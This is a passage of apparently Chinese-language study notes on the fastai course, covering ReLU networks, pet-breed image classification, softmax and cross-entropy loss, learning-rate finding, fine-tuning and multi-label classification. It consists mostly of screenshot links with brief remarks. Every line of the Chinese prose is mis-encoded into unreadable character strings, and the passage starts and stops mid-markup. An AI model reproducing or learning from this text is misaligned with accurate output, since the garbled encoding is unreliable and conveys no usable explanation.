src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/90.png"><br>ä»–è¢«å½“åšå‡½æ•°è°ƒç”¨æ—¶ï¼Œæœ‰ç€å’Œlinearï¼ˆï¼‰ä¸€æ ·çš„åŠŸèƒ½ï¼Œä»–èƒ½è‡ªåŠ¨åˆ›å»ºå¹¶ä¸”åˆå§‹åŒ–æƒå€¼ï¼ˆåŒ…æ‰©biasï¼‰ï¼Œå¹¶è‡ªåŠ¨ä¿ç•™æ¢¯åº¦ã€‚<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/91.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/92.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/93.png"><br>å¯¹æ¯”ï¼š<img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/94.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/95.png"><br>å®é™…ä½¿ç”¨æ—¶ç”¨<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/96.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/97.png"><br>è®­ç»ƒé›†ä¸­çš„æ•°æ®ä¼šè¢«æ‰“ä¹±ä½†æ˜¯éªŒè¯é›†é‡Œä¸ä¼š</p><h3 id="å­¦ä¹ å™¨ç±»"><a href="#å­¦ä¹ å™¨ç±»" class="headerlink" title="å­¦ä¹ å™¨ç±»"></a>å­¦ä¹ å™¨ç±»</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/98.png"><br>ä»–ä¼šè°ƒç”¨<img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/99.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/100.png"></p><h2 id="Adding-a-Nonlinearityâ€”â€”ReLu"><a href="#Adding-a-Nonlinearityâ€”â€”ReLu" class="headerlink" title="Adding a Nonlinearityâ€”â€”ReLu"></a>Adding a Nonlinearityâ€”â€”ReLu</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/101.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/102.png"><br>reluå°±æ˜¯<img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/103.png">è¿™ä¸€è¡Œ<br>åŠ reluæ˜¯ä¸ºäº†å¢å¼ºæ‹Ÿåˆèƒ½åŠ›ï¼Œä¸ç„¶åªæœ‰å…ˆçº¿æ€§æµ‹å±‚çš„è¯ï¼Œå¤šä¸ªçº¿æ€§å±‚å¯ä»¥è½¬åŒ–æˆä¸ºä¸€ä¸ªçº¿æ€§å±‚ã€‚ï¼ˆé€šç”¨è¿‘ä¼¼å®šç†ï¼‰<br>å½“ç„¶å› ä¸ºæ¢¯åº¦æ˜¯é€å±‚ä¼ é€’çš„ï¼Œreluä¼šå‡ºç°æ¢¯åº¦ä¸º0çš„æƒ…å†µï¼Œå¯¼è‡´å¾ˆå¤šç¥ç»å…ƒå¤±æ´»æµªè´¹ç®—åŠ›ã€‚<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/104.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/105.png"><br>æœ€åè¾“å‡ºçš„æ˜¯1ä¸ªæ•°ï¼Œå› ä¸º<br>è¾“å…¥æ˜¯1<em>28</em>28ï¼Œç¬¬ä¸€æ¬¡çŸ©é˜µè¿ç®—ï¼ˆ1ï¼Œ28<em>28ï¼‰@ ï¼ˆ28</em>28ï¼Œ30ï¼‰<br>ç¬¬äºŒæ¬¡çŸ©é˜µè¿ç®—ï¼ˆ1ï¼Œ30ï¼‰     @  ï¼ˆ30ï¼Œ1ï¼‰<br>ç›¸å½“äºæ˜¯å…ˆæ•´ç†äº†30ä¸ªçº¿æ€§ç‰¹å¾ï¼Œå†æŠŠè¿™30ä¸ªç‰¹å¾åˆç»¼åˆäº†ä¸€ä¸‹<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/106.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/107.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/108.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/109.png"><br>æœ€åä¸€è¡Œçš„ç¬¬3åˆ—ï¼šå‡†ç¡®ç‡</p><h3 id="æŸ¥çœ‹æ¨¡å‹"><a href="#æŸ¥çœ‹æ¨¡å‹" class="headerlink" title="æŸ¥çœ‹æ¨¡å‹"></a>æŸ¥çœ‹æ¨¡å‹</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/110.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/111.png"></p><h3 id="æŸ¥çœ‹ç‰¹å¾å›¾åƒ"><a href="#æŸ¥çœ‹ç‰¹å¾å›¾åƒ" class="headerlink" title="æŸ¥çœ‹ç‰¹å¾å›¾åƒ"></a>æŸ¥çœ‹ç‰¹å¾å›¾åƒ</h3><p>wæ˜¯30<em>28</em>28<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/112.png"></p><h3 id="ç”¨fastaiè¯•è¯•"><a href="#ç”¨fastaiè¯•è¯•" class="headerlink" title="ç”¨fastaiè¯•è¯•"></a>ç”¨fastaiè¯•è¯•</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/113.png"></p><h3 id="jargon"><a href="#jargon" class="headerlink" title="jargon"></a>jargon</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/114.png"></p><h1 id="Image-Classification"><a href="#Image-Classification" class="headerlink" title="Image Classification"></a>Image Classification</h1><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/115.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/116.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/117.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/118.png"><br>fastaiä¸­å¤§å¤šæ•°è¿”å›é›†åˆçš„å‡½æ•°å’Œæ–¹æ³•éƒ½ä½¿ç”¨ä¸€ä¸ªåä¸ºLçš„ç±»<br>Lå¯ä»¥è¢«è®¤ä¸ºæ˜¯æ™®é€šPythonåˆ—è¡¨ç±»å‹çš„å¢å¼ºç‰ˆæœ¬ï¼Œä¸ºæ™®é€šæ“ä½œå¢åŠ äº†ä¾¿åˆ©ã€‚<br>æ¯”å¦‚åœ¨å¼€å¤´å°±è¯´æ˜äº†æœ‰7394ä¸ªå…ƒç´ ã€‚</p><h2 id="ä»»åŠ¡ï¼šåˆ†è¾¨petså“ç§"><a href="#ä»»åŠ¡ï¼šåˆ†è¾¨petså“ç§" class="headerlink" title="ä»»åŠ¡ï¼šåˆ†è¾¨petså“ç§"></a>ä»»åŠ¡ï¼šåˆ†è¾¨petså“ç§</h2><h3 id="æ¼”ç¤ºæ­£åˆ™è¡¨è¾¾å¼"><a href="#æ¼”ç¤ºæ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ¼”ç¤ºæ­£åˆ™è¡¨è¾¾å¼"></a>æ¼”ç¤ºæ­£åˆ™è¡¨è¾¾å¼</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/119.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/120.png"></p><h3 id="åŠ è½½æ•°æ®"><a href="#åŠ è½½æ•°æ®" class="headerlink" title="åŠ è½½æ•°æ®"></a>åŠ è½½æ•°æ®</h3><p>å…¶ä¸­ç‹¬ç«‹å˜é‡æ˜¯å›¾åƒtå› å˜é‡æ˜¯ç§ç±»(categoryBlock)<br>ä½¿ç”¨pathé‡Œæ–‡ä»¶ä»¬çš„nameå±æ€§<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/121.png"><br>æ¥ä¸‹æ¥è¿™ä¸€æ­¥æ˜¯<br>Presizing<br>é¢„å…ˆå®šå°ºå¯¸</p><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/122.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/123.png"><br>ä¸‹å›¾ä¸­å·¦å›¾ä¸ºfastaiå¤„ç†æ•ˆæœ<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/124.png"></p><h3 id="Checking-and-Debugging-a-DataBlock"><a href="#Checking-and-Debugging-a-DataBlock" class="headerlink" title="Checking and Debugging a DataBlock"></a>Checking and Debugging a DataBlock</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/125.png"></p><h4 id="åŠ ä¸ŠuniqueæŸ¥çœ‹åŒä¸€åªç‹—"><a href="#åŠ ä¸ŠuniqueæŸ¥çœ‹åŒä¸€åªç‹—" class="headerlink" title="åŠ ä¸ŠuniqueæŸ¥çœ‹åŒä¸€åªç‹—"></a>åŠ ä¸ŠuniqueæŸ¥çœ‹åŒä¸€åªç‹—</h4><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/126.png"></p><h3 id="ä¸€ä¸ªè°ƒè¯•å·¥å…·"><a href="#ä¸€ä¸ªè°ƒè¯•å·¥å…·" class="headerlink" title="ä¸€ä¸ªè°ƒè¯•å·¥å…·"></a>ä¸€ä¸ªè°ƒè¯•å·¥å…·</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/127.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/128.png"><br>ï¼ˆæ¯”æŠ¥é”™æ˜¾ç¤ºçš„å¥½</p><h3 id="è®­ç»ƒä¸€ä¸‹"><a href="#è®­ç»ƒä¸€ä¸‹" class="headerlink" title="è®­ç»ƒä¸€ä¸‹"></a>è®­ç»ƒä¸€ä¸‹</h3><p>fastaiä¼šè‡ªåŠ¨é€‰æ‹©åˆé€‚çš„æŸå¤±å‡½æ•°<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/129.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/130.png"></p><h3 id="Cross-Entropy-Loss"><a href="#Cross-Entropy-Loss" class="headerlink" title="Cross-Entropy Loss"></a>Cross-Entropy Loss</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/131.png"></p><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/132.png"><br>ä¸‹å›¾é‡Œé¢çš„dlæ˜¯ä¸ªå‚æ•°<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/133.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/134.png"><br>å¯ä»¥çœ‹åˆ°æ¯ä¸ªæ¦‚ç‡çš„å’Œæ˜¯1ï¼Œè¿™æ˜¯é€šè¿‡softmaxåšåˆ°çš„</p><h3 id="softmax"><a href="#softmax" class="headerlink" title="softmax"></a>softmax</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/135.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/136.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/137.png"><br>å¯ä»¥çœ‹åˆ°ä»–ä»¬çš„å’Œå¹¶ä¸æ˜¯1<br>åªèƒ½åˆ†åˆ«ä»£è¡¨å¯¹3å’Œ7çš„ç½®ä¿¡åº¦<br>å¯¹ä¸¤ä¸ªé¢„æµ‹å€¼åšå·®å†sigmoidå¾—åˆ°å¯¹3ï¼ˆå¤§æ¦‚ç‡çš„é‚£ä¸ªæ•°ï¼‰çš„æ¦‚ç‡ï¼Œ1-è¿™ä¸ªæ¦‚ç‡å¾—åˆ°å¯¹7çš„æ¦‚ç‡</p><h3 id="æ‰©å±•åˆ°å¤šä¸ªç±»åˆ«"><a href="#æ‰©å±•åˆ°å¤šä¸ªç±»åˆ«" class="headerlink" title="æ‰©å±•åˆ°å¤šä¸ªç±»åˆ«"></a>æ‰©å±•åˆ°å¤šä¸ªç±»åˆ«</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/138.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/139.png"><br>å› ä¸ºè¿™é‡Œçš„æ¯ä¸€ä¸ªå€¼éƒ½æ˜¯é™¤ä»¥æ€»å’Œå¾—åˆ°çš„æ‰€ä»¥å®ƒä»¬ç›¸åŠ ä¼šç­‰äº1</p><h3 id="Log-Likelihood"><a href="#Log-Likelihood" class="headerlink" title="Log Likelihood"></a>Log Likelihood</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/140.png"><br>ä»¥ä¸Šæ˜¯softmaxä¹‹åçš„å€¼<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/141.png"><br>ç¬¬ä¸€é¡¹è¡¨ç¤ºçš„æ˜¯è¿”å›ç¬¬å‡ è¡Œ<br>ç¬¬äºŒé¡¹è¡¨ç¤ºçš„æ˜¯è¿”å›è¯¥è¡Œçš„ç¬¬å‡ åˆ—å…ƒç´ <br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/142.png"></p><h1 id="è¿™é‡Œçš„lossè®¡ç®—æ–¹å¼å­˜ç–‘"><a href="#è¿™é‡Œçš„lossè®¡ç®—æ–¹å¼å­˜ç–‘" class="headerlink" title="è¿™é‡Œçš„lossè®¡ç®—æ–¹å¼å­˜ç–‘"></a>è¿™é‡Œçš„lossè®¡ç®—æ–¹å¼å­˜ç–‘</h1><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/143.png"><br>å–è´Ÿå·æ˜¯å› ä¸ºæƒ³è®©æŸå¤±å‡½æ•°æ˜¯è´Ÿçš„</p><h3 id="å–å¯¹æ•°"><a href="#å–å¯¹æ•°" class="headerlink" title="å–å¯¹æ•°"></a>å–å¯¹æ•°</h3><p>å¢å¤§æŸå¤±ä¹‹é—´çš„å·®å¼‚</p><p>å½“æˆ‘ä»¬é¦–å…ˆå–softmaxï¼Œç„¶åå–å®ƒçš„å¯¹æ•°ä¼¼ç„¶ï¼Œè¿™ä¸ªç»„åˆå«åšäº¤å‰ç†µæŸå¤±ã€‚åœ¨PyTorchä¸­ï¼Œè¿™å¯ä»¥ä½œä¸ºnn.CrossEntropyLossä½¿ç”¨ï¼ˆå®é™…ä¸Šï¼Œå®ƒæ‰§è¡Œlog_softmaxï¼Œç„¶åæ˜¯nll_lossï¼‰ï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/144.png"><br>ä»¥ä¸Šä¸¤ç§å†™æ³•éƒ½å¯ä»¥<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/145.png"><br>ä»¥ä¸Šä¸ºæŸ¥çœ‹å–å‡å€¼ä¹‹å‰çš„tensor</p><h4 id="ä¸ºä»€ä¹ˆæŸå¤±å‡½æ•°å€¼æ˜¯è´Ÿæ•°"><a href="#ä¸ºä»€ä¹ˆæŸå¤±å‡½æ•°å€¼æ˜¯è´Ÿæ•°" class="headerlink" title="ä¸ºä»€ä¹ˆæŸå¤±å‡½æ•°å€¼æ˜¯è´Ÿæ•°"></a><del>ä¸ºä»€ä¹ˆæŸå¤±å‡½æ•°å€¼æ˜¯è´Ÿæ•°</del></h4><h3 id="æŸ¥çœ‹æ··æ·†çŸ©é˜µ"><a href="#æŸ¥çœ‹æ··æ·†çŸ©é˜µ" class="headerlink" title="æŸ¥çœ‹æ··æ·†çŸ©é˜µ"></a>æŸ¥çœ‹æ··æ·†çŸ©é˜µ</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/146.png"></p><h3 id="æŸ¥çœ‹å®¹æ˜“æ··æ·†çš„ç±»åˆ«"><a href="#æŸ¥çœ‹å®¹æ˜“æ··æ·†çš„ç±»åˆ«" class="headerlink" title="æŸ¥çœ‹å®¹æ˜“æ··æ·†çš„ç±»åˆ«"></a>æŸ¥çœ‹å®¹æ˜“æ··æ·†çš„ç±»åˆ«</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/147.png"></p><h2 id="Improving-Our-Model"><a href="#Improving-Our-Model" class="headerlink" title="Improving Our Model"></a>Improving Our Model</h2><h4 id="è°ƒå¤§å­¦ä¹ ç‡"><a href="#è°ƒå¤§å­¦ä¹ ç‡" class="headerlink" title="è°ƒå¤§å­¦ä¹ ç‡"></a>è°ƒå¤§å­¦ä¹ ç‡</h4><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/148.png"><br>å¯ä»¥çœ‹åˆ°æŸå¤±å¢åŠ </p><h3 id="å¯»æ‰¾åˆé€‚çš„å­¦ä¹ ç‡"><a href="#å¯»æ‰¾åˆé€‚çš„å­¦ä¹ ç‡" class="headerlink" title="å¯»æ‰¾åˆé€‚çš„å­¦ä¹ ç‡"></a>å¯»æ‰¾åˆé€‚çš„å­¦ä¹ ç‡</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/149.png"><br>é€‰æ‹©ä¸‹å›¾è¿™ä¸¤ä¸ªå€¼ä¹‹é—´çš„æ¯”è¾ƒå¥½<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/150.png"></p><h3 id="fine-tune"><a href="#fine-tune" class="headerlink" title="fine_tune"></a>fine_tune</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/151.png"><br>ä¸€å¼€å§‹å…ˆå†»ç»“ï¼Œåªæœ‰æœ€åä¸€å±‚çš„å‚æ•°æ—¶å¯è®­ç»ƒçš„<br>è§£å†»ä¹‹åæ‰€æœ‰å‚æ•°éƒ½å¯ä»¥è®­ç»ƒ<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/152.png"><br>æ³¨æ„cnn_learneré»˜è®¤ä¼šå†»ç»“é¢„è®­ç»ƒæ¨¡å‹<br>ä¸Šå›¾ä¸­æ˜¯å¯¹æœ€åä¸€å±‚çš„å‚æ•°è®­ç»ƒäº†3è½®<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/153.png"><br>æ­¤æ—¶çš„learning_rateå¯èƒ½å·²ç»ä¸æ˜¯æœ€ä¼˜è§£äº†ï¼Œæ‰€ä»¥å†è°ƒç”¨ä¸€æ¬¡<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/154.png"><br>å°è¯•æ‰¾å‡ºæ¨¡å‹è¡¨ç°å¼€å§‹å†æ¬¡å˜å·®çš„ç‚¹<br>é€‰å–æ¯”è¿™ä¸ªå€¼å°æ•°åå€çš„å€¼<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/155.png"><br>åœ¨è¿™é‡Œè¿˜èƒ½è®­ç»ƒçš„æ›´å¥½ï¼Œå› ä¸ºæœ€åä¸€å±‚åªè®­ç»ƒäº†ä¸‰è½®ï¼Œéœ€è¦å¯¹æœ€åä¸€å±‚å†å¤šè®­ç»ƒï¼Œæ‰€ä»¥è¦è®¾ç½®ä¸åŒçš„å­¦ä¹ ç‡<br>ç¥ç»ç½‘ç»œä¸­ä¸åŒå±‚åº”è¯¥ç”¨ä¸åŒçš„å­¦ä¹ ç‡æ¥è¿›è¡Œè®­ç»ƒ<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/156.png"></p><ul><li>åœ¨fastaiä¸­è¿™ä¸ªçš„æ„æ€æ˜¯åœ¨ç¬¬ä¸€å±‚çš„å­¦ä¹ ç‡æ˜¯1e-6ï¼Œè€Œæœ€åä¸€å±‚çš„å­¦ä¹ ç‡æ˜¯1e-4ï¼Œå…¶ä»–ä¸­é—´å±‚çš„å­¦ä¹ ç‡ä¼šæ˜¯ä»–ä»¬ä¸­é—´çš„ä¸€äº›å€¼</li><li>learn.fit_one_cycle(12, lr_max=slice(1e-6,1e-4))çš„å‰1/3çš„batchså­¦ä¹ ç‡é€æ¸å¢å¤§ï¼Œä¹‹åé€æ¸å‡å°</li></ul><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/157.png"><br>æ˜¾å­˜ä¸å¤Ÿæˆ–è€…æ˜¯æƒ³åŠ å¿«è®­ç»ƒé€Ÿåº¦æ—¶<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/158.png"><br>ä»£ä»·æ˜¯å‡†ç¡®ç‡é™ä½</p><blockquote><p>ç”¨å°æ¨¡å‹åšæ•°æ®æ¸…æ´—å’Œæµ‹è¯•ä¸é”™</p></blockquote><h1 id="Multi-label-classification"><a href="#Multi-label-classification" class="headerlink" title="Multi-label classification"></a>Multi-label classification</h1><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/159.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/160.png"><br>å–ç¬¬ä¸€åˆ—<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/161.png"><br>å–ç¬¬ä¸€è¡Œ<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/162.png"><br>è¿™ä¸¤ç§å†™æ³•æ•ˆæœå®Œå…¨ä¸€è‡´<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/163.png"><br>åˆ›å»ºæ–°çš„åˆ—<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/164.png"></p><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h3 id="Constructing-a-DataBlock"><a href="#Constructing-a-DataBlock" class="headerlink" title="Constructing a DataBlock"></a>Constructing a DataBlock</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/165.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/166.png"><br>ä»¥ tuple æ ¼å¼è¿”å›æ¯ç»„å¯¹åº”å…ƒç´ <br>ä¸‹é¢è¿™ç§å†™æ³•æ˜¯ä¸€æ ·çš„æ•ˆæœ<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/167.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/168.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/169.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/170.png"><br>æ‰€ä»¥è¿™æ˜¯æˆ‘ä»¬åœ¨fastaiä¸­å»ºç«‹è‡ªå˜é‡å’Œå› å˜é‡çš„ä¸»è¦æ–¹æ³•<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/171.png"><br>ä¸Šé¢è¿™äº›éº»çƒ¦ï¼Œæ‰€ä»¥ç”¨datablock</p><h3 id="DataBlock"><a href="#DataBlock" class="headerlink" title="DataBlock"></a>DataBlock</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/172.png"><br>ä¹‹åä¼ å…¥dataframe<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/173.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/174.png"><br>å¯ä»¥çœ‹åˆ°å¦‚æœä¸ç»™å®šxyçš„è¯é‚£å°±å¾—ä¸åˆ°æˆ‘ä»¬æƒ³è¦çš„è‡ªå˜é‡ï¼ˆå›¾ç‰‡ï¼‰å’Œå› å˜é‡ï¼ˆæ ‡ç­¾ï¼‰<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/175.png"><br>ä¹Ÿå¯ä»¥è¿™ä¹ˆå†™<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/176.png"><br>å½“ç„¶åªå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶åæ˜¯ä¸å¤Ÿçš„ï¼Œè¦å¾—åˆ°ä»–çš„è·¯å¾„<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/177.png"><br>ä¸ºäº†è·å–å›¾ç‰‡ï¼Œéœ€è¦ä¼ å…¥å¯¹åº”çš„blocks<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/178.png"><br>è¿™é‡Œæ˜¯ç‹¬çƒ­ç¼–ç ï¼Œå¤šæ ‡ç­¾çš„åˆ†ç±»ç”¨ç‹¬çƒ­ç¼–ç å¾ˆæ–¹ä¾¿ã€‚<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/179.png"><br>å¯¹ã€19ã€‘çš„ç†è§£ï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/180.png"></p><h2 id="åˆ’åˆ†éªŒè¯é›†"><a href="#åˆ’åˆ†éªŒè¯é›†" class="headerlink" title="åˆ’åˆ†éªŒè¯é›†"></a>åˆ’åˆ†éªŒè¯é›†</h2><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/181.png"><br>è¦æŒ‰ç…§csvä¸­çš„æ ‡ç­¾åˆ’åˆ†éªŒè¯é›†ï¼ŒåŒæ ·æ˜¯ä¼ å…¥ä¸€ä¸ªå‚æ•°<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/182.png"><br>DataFrame-ã€‹DataBlock-ã€‹DataLoaderï¼ˆæ³¨æ„æ²¡æœ‰Datasetï¼‰<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/183.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/184.png"></p><h3 id="Binary-Cross-Entropy"><a href="#Binary-Cross-Entropy" class="headerlink" title="Binary Cross-Entropy"></a>Binary Cross-Entropy</h3><p><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/185.png"><br>ä¸€ä¸ªbatchæœ‰64å¼ å›¾ï¼Œæ¯ä¸ªå›¾å¯¹åº”20ä¸ªå¯èƒ½çš„æ ‡ç­¾<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/186.png"><br>è¿˜æ²¡æœ‰è®­ç»ƒæ‰€ä»¥è¿™é‡Œé¢çš„å‚æ•°å€¼å…¶å®æ˜¯éšæœºçš„<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/187.png"><br>ç”±äºå¹¿æ’­æœºåˆ¶è¿™ä¸ªå‡½æ•°ä¼šä½œç”¨åœ¨æ¯ä¸€åˆ—ä¸Š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/188.png"><br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/189.png"><br>æ³¨æ„è¿™é‡Œæ˜¯ç”¨äº†sigmoidåšå¤šæ ‡ç­¾åˆ†ç±»ï¼Œsoftmaxä¹Ÿå¯ä»¥<br>BCEçš„ç‰¹æ®Šä¹‹å¤„å°±åœ¨äºå–äº†log</p><h2 id="è°ƒæ•´å‡†ç¡®ç‡å‡½æ•°"><a href="#è°ƒæ•´å‡†ç¡®ç‡å‡½æ•°" class="headerlink" title="è°ƒæ•´å‡†ç¡®ç‡å‡½æ•°"></a>è°ƒæ•´å‡†ç¡®ç‡å‡½æ•°</h2><p>è®¾ç½®é˜ˆå€¼0.5<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/190.png"></p><h3 id="å€ŸåŠ©partialå‡½æ•°è°ƒæ•´å‡½æ•°å‚æ•°çš„é»˜è®¤å€¼"><a href="#å€ŸåŠ©partialå‡½æ•°è°ƒæ•´å‡½æ•°å‚æ•°çš„é»˜è®¤å€¼" class="headerlink" title="å€ŸåŠ©partialå‡½æ•°è°ƒæ•´å‡½æ•°å‚æ•°çš„é»˜è®¤å€¼"></a>å€ŸåŠ©partialå‡½æ•°è°ƒæ•´å‡½æ•°å‚æ•°çš„é»˜è®¤å€¼</h3><p>ä¾‹å­å¦‚ä¸‹å›¾<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/191.png"><br>freeze_epochæœŸé—´å¯ä»¥åªè®­ç»ƒæœ€åå±‚<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/192.png"><br>ä¹Ÿå¯ä»¥æŒ‡å®šæŸå¤±å‡½æ•°<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/193.png"><br>é€‰æ‹©é˜ˆå€¼å¾ˆé‡è¦ã€‚å¦‚æœé€‰æ‹©çš„é˜ˆå€¼å¤ªä½ï¼Œåˆ™é€šå¸¸æ— æ³•é€‰æ‹©æ­£ç¡®æ ‡è®°çš„å¯¹è±¡ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æ›´æ”¹åº¦é‡ï¼Œç„¶åè°ƒç”¨validateæ¥çœ‹åˆ°è¿™ä¸€ç‚¹ï¼Œvalidateè¿”å›éªŒè¯æŸå¤±å’Œåº¦é‡ï¼š<br><img src="https://snowgo.top/medias/medias/fastai%E6%95%99%E7%A8%8B/194.png"></p><h3 